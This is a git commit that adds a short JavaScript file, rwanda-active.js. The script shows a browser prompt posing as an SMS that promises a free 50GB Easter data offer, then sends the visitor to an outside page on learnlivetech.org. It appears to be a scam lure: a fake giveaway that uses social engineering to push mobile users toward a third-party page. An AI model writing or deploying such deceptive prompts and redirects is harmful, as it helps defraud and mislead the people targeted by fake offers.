309980d46f2b29db76a653126103e980da8d45e3
bigukpe <bigaka42@gmail.com>
2025-04-19 07:18:09 +0100

    Create rwanda-active.js

---
+++ rwanda-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations, your Mobile number is eligible to receive 50gb Easter Holiday Offer, Press Ok to activate Now ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://learnlivetech.org/rwanda-easter.html';
+}
